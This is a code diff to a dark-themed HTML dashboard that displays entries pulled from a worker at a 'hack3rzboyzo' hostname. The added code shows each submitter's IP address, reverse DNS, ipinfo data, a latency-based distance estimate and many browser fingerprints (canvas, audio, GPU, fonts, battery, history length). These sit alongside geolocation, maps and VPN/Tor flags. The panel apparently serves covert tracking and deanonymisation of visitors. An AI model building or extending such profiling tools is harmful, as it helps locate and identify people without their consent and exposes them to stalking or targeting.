@@ -29,9 +29,10 @@
   .pill { border:1px solid var(--line); padding:1px 6px; font-size:10px; text-transform:uppercase; letter-spacing:.08em; }
   .pill.vpn { color:var(--warn); border-color:#4a3018; }
   .pill.new { color:var(--acc); border-color:#1d3a55; }
+  .pill.ip { color:var(--fg); border-color:#2b3a48; font-family:inherit; text-transform:none; letter-spacing:0; }
   .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(230px,1fr)); gap:2px 16px; padding:10px 12px; border-top:1px solid var(--line); font-size:11px; }
   .grid span { color:var(--dim); }
-  .grid b { color:var(--fg); font-weight:400; }
+  .grid b { color:var(--fg); font-weight:400; word-break:break-all; }
   details { padding:0 12px 10px; }
   summary { color:var(--dim); cursor:pointer; font-size:11px; }
   pre { overflow:auto; background:#0e141b; padding:10px; border:1px solid var(--line); font-size:11px; }
@@ -48,7 +49,7 @@
 <div class="controls">
   <input id="w" placeholder="worker url" size="34">
   <button id="setw">set</button>
-  <input id="q" placeholder="search text / city / isp" size="24">
+  <input id="q" placeholder="search text / city / isp / ip" size="24">
   <select id="cc"><option value="">all countries</option></select>
   <select id="sort">
     <option value="new">newest</option>
@@ -64,7 +65,7 @@
 <script>
 const WORKER = new URLSearchParams(location.search).get("w")
   || localStorage.getItem("worker")
-  || "https://slave01.hack3rzboyzo.workers.dev/";
+  || "https://slave01.hack3rzboyzo.workers.dev";
 
 let items = [], stats = null, vpnOnly = false;
 
@@ -127,6 +128,7 @@ function renderPanel() {
   p.innerHTML = `
     <div class="tallies">
       <div><b>${stats.total}</b> entries</div>
+      <div><b>${stats.ips}</b> with ip</div>
       <div><b>${stats.geotagged}</b> geotagged</div>
       <div><b>${stats.vpn}</b> via vpn/hosting</div>
       <div><b>${stats.bots}</b> bots</div>
@@ -157,7 +159,7 @@ function render() {
     if (vpnOnly && !m.vpn) return false;
     if (cc && m.cc !== cc) return false;
     if (q) {
-      const hay = [i.text, m.city, m.region, m.near, m.isp, m.cc].join(" ").toLowerCase();
+      const hay = [i.text, m.city, m.region, m.near, m.isp, m.cc, m.ip, m.ptr].join(" ").toLowerCase();
       if (!hay.includes(q)) return false;
     }
     return true;
@@ -176,8 +178,10 @@ function render() {
 
   list.innerHTML = rows.map((i, idx) => {
     const m = i.meta || {};
+    const h = m.h || {};
     const where = [m.flag, m.city, m.region, m.cc].filter(Boolean).join(" ");
     const pills = [
+      m.ip ? `<span class="pill ip">${esc(m.ip)}</span>` : "",
       m.vpn ? `<span class="pill vpn">vpn/hosting</span>` : "",
       m.tor ? `<span class="pill vpn">tor</span>` : "",
       m.bot ? `<span class="pill vpn">bot</span>` : "",
@@ -190,6 +194,9 @@ function render() {
       ["place", where],
       ["near", m.near],
       ["distance", m.d],
+      ["ptr", m.ptr ? esc(m.ptr) : ""],
+      ["ipinfo", m.ipinfo ? esc([m.ipinfo.org, m.ipinfo.city, m.ipinfo.hostname].filter(Boolean).join(" · ")) : ""],
+      ["rtt floor", m.rttKm != null ? m.rttKm + " km" : ""],
       ["weather", m.wx],
       ["moon", m.moon],
       ["elevation", m.elev],
@@ -197,7 +204,23 @@ function render() {
       ["pop", m.pop],
       ["bot score", m.bot != null ? String(m.bot) : ""],
       ["github latency", m.gh != null ? m.gh + "ms" : ""],
-      ["hash", m.hash ? esc(m.hash) : ""]
+      ["hash", m.hash ? esc(m.hash) : ""],
+      ["client hints", h.uaData ? esc(h.uaData) : ""],
+      ["gpu", h.gpu ? esc(h.gpu) : ""],
+      ["audio fp", h.audio ? esc(h.audio) : ""],
+      ["canvas fp", h.canvas ? esc(h.canvas) : ""],
+      ["fonts", h.fonts ? esc(h.fonts) : ""],
+      ["storage", h.storage ? esc(h.storage) : ""],
+      ["devices", h.devices ? esc(h.devices) : ""],
+      ["voices", h.voices != null ? String(h.voices) : ""],
+      ["screen", h.screen ? `${esc(h.screen)} dpr${h.dpr ?? "?"}` : ""],
+      ["window", h.window ? esc(h.window) : ""],
+      ["zoom", h.zoom != null ? h.zoom + "%" : ""],
+      ["battery", h.battery ? esc(h.battery) : ""],
+      ["conn", h.conn ? `${esc(h.conn)} ~${h.down ?? "?"}Mbps` : ""],
+      ["webdriver", h.webdriver ? "yes" : ""],
+      ["dark", h.dark ? "yes" : ""],
+      ["history", h.historyLen != null ? String(h.historyLen) : ""]
     ].filter(([, v]) => v);
 
     return `<div class="card">
@@ -207,6 +230,7 @@ function render() {
         <span>${esc(new Date(i.ts).toISOString().replace("T", " ").slice(0, 19))}</span>
         <span>${esc(ago(i.ts))}</span>
         ${m.lat != null ? `<a href="https://www.openstreetmap.org/?mlat=${m.lat}&mlon=${m.lon}#map=11/${m.lat}/${m.lon}" target="_blank" rel="noopener">map</a>` : ""}
+        ${m.ip ? `<a href="https://ipinfo.io/${esc(m.ip)}" target="_blank" rel="noopener">ipinfo</a>` : ""}
         <button data-copy="${idx}" style="margin-left:auto">copy json</button>
       </div>
       <div class="card-b">${esc(i.text)}</div>
